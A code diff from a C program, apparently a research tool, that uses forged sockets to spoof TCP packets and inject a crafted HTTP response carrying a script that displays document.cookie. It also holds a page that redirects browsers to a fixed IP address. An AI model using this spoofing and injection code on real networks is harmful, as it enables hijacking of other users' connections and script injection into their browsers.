@@ -1,4 +1,3 @@
-
 #include <stdlib.h>
 #include <event2/event.h>
 #include <event2/event_struct.h>
@@ -15,12 +14,17 @@
 #include <fcntl.h>
 #include "forge_socket.h"
 #include <string.h>
+#include "tcp_spoof.h"
 
 #define DEFAULT_SPORT   888
 
 #define RESPONSE "HTTP/1.0 200 OK\r\nContent-Length: %d\r\nConnection: close\r\nContent-type: text/html;\r\n\r\n%s\n"
 
 #define HTML_CODE "<html><h1>Hi</h1><script type=\"text/javascript\">setTimeout(function(){document.location=\"http://141.212.109.239:888/\";},100);</script></html>"
+
+#define INJECT_HTTP "HTTP/1.1 200\nContent-Type: text/html;\n\n<script>alert(document.cookie);</script>\n"
+#define SEQ_STEP 1024
+
 
 void http_req_cb(struct bufferevent *bev, void *ctx)
 {
@@ -45,6 +49,8 @@ void echo_read_cb(struct bufferevent *bev, void *ctx)
 {
     return;
 }
+
+
 
 void on_tcp_accept(struct evconnlistener *listener, 
                    evutil_socket_t sock, struct sockaddr *addr, int socklen, void *ptr)
@@ -98,6 +104,8 @@ int main(int argc, char *argv[])
     int sock;
     struct sockaddr_in sin;
 
+
+    init_sock();    // So we can spoof packets
     base = event_base_new();
 
     sock = socket(AF_INET, SOCK_FORGE, 0);
